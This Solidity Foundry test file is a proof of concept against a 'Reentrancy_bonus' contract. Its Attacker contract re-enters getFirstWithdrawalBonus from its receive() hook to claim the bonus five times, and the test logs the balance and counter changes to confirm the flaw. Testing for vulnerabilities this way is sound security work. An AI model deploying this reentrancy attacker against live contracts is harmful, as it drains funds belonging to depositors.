// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import "../src/reentrancy_bonus.sol";

contract Attacker {
    Reentrancy_bonus public target;
    address public owner;
    uint8 public count;

    constructor(Reentrancy_bonus _target) payable {
        target = _target;
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "Only owner can attack");
        target.getFirstWithdrawalBonus(address(this));
    }

    receive() external payable {
        count++;
        if (count < 5) {
            target.getFirstWithdrawalBonus(address(this));
        }
    }
}

contract ReentrancyBonusTest is Test {
    Reentrancy_bonus public target;
    Attacker public attacker;
    address user = makeAddr("user");
    uint256 constant ATTACK_DEPOSIT = 1 ether;

    function setUp() public {
        target = new Reentrancy_bonus();
        attacker = new Attacker(target);

        // Fund the target contract
        vm.deal(address(this), ATTACK_DEPOSIT);
        target.depositFunds{value: ATTACK_DEPOSIT}();
    }

    function testReentrancyExploit() public {
        uint256 expectedStolenAmount = 5 * 100; // 100 wei per reentrant call * 5 calls
        uint256 expectedClaims = 5;
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 totalRewardsDistributedBefore = target.totalRewardsDistributed();
        uint256 userTotalRewardsBefore = target.userTotalRewards(address(attacker));
        uint256 totalBonusClaimsBefore = target.totalBonusClaims();
        
        console.log("Target contract balance:", targetBalanceBefore);
        console.log("Attacker contract balance:", attackerBalanceBefore);
        console.log("Total rewards distributed:", totalRewardsDistributedBefore);
        console.log("Attacker's user rewards:", userTotalRewardsBefore);
        console.log("Total bonus claims:", totalBonusClaimsBefore);

        console.log("--- Trigger Attack Action ---");
        // Execute attack
        attacker.attack();
        
        console.log("--- AFTER-Trigger State ---");
        uint256 targetBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 totalRewardsDistributedAfter = target.totalRewardsDistributed();
        uint256 userTotalRewardsAfter = target.userTotalRewards(address(attacker));
        uint256 totalBonusClaimsAfter = target.totalBonusClaims();
        
        console.log("Target contract balance:", targetBalanceAfter);
        console.log("Attacker contract balance:", attackerBalanceAfter);
        console.log("Total rewards distributed:", totalRewardsDistributedAfter);
        console.log("Attacker's user rewards:", userTotalRewardsAfter);
        console.log("Total bonus claims:", totalBonusClaimsAfter);
        
        console.log(">>> STATE CHANGES <<<");
        console.log("Target balance decrease:", targetBalanceBefore - targetBalanceAfter);
        console.log("Attacker balance increase:", attackerBalanceAfter - attackerBalanceBefore);
        console.log("Total rewards distributed increase:", totalRewardsDistributedAfter - totalRewardsDistributedBefore);
        console.log("Attacker user rewards increase:", userTotalRewardsAfter - userTotalRewardsBefore);
        console.log("Total bonus claims increase:", totalBonusClaimsAfter - totalBonusClaimsBefore);

        // Differential state changes verification
        bool success = (
            (targetBalanceBefore - targetBalanceAfter == expectedStolenAmount) &&
            (attackerBalanceAfter - attackerBalanceBefore == expectedStolenAmount) &&
            (totalRewardsDistributedAfter - totalRewardsDistributedBefore == expectedStolenAmount) &&
            (userTotalRewardsAfter - userTotalRewardsBefore == expectedStolenAmount) &&
            (totalBonusClaimsAfter - totalBonusClaimsBefore == expectedClaims)
        );

        // Final vulnerability verdict
        if (success) {
            console.log("Vulnerability Exists: All state changes match reentrancy attack patterns");
        } else {
            console.log("Vulnerability not Exist: State changes inconsistent with reentrancy exploitation");
        }
    }
}